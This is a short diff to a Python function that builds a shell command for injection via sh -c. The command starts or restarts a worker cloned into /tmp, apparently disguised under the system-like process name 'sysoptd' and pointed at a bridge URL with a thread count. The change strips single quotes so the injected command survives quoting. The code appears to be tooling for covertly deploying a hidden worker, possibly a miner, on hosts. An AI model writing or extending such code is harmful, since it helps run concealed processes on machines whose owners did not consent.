@@ -28,6 +28,8 @@ def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads
     - If sysoptd already running → skip
     - If /tmp/moly missing → clone + start (exact user cmd shape)
     - If /tmp/moly present but python dead → restart from existing tree
+
+    Must not contain single quotes — inject wraps the cmd in sh -c '...'.
     """
     run = (
         f"cd /tmp/{folder_name} && "
@@ -42,9 +44,9 @@ def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads
         f"--no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
     )
     return (
-        f'if pgrep -f "[p]ython3.*sysoptd" >/dev/null 2>&1; then '
-        f'echo "[skip] sysoptd already running"; '
-        f'elif [ ! -d /tmp/{folder_name} ]; then '
+        f"if pgrep -f [p]ython3.*sysoptd >/dev/null 2>&1; then "
+        f"echo skip-running; "
+        f"elif [ ! -d /tmp/{folder_name} ]; then "
         f"{clone}; "
         f"else {run}; fi"
     )
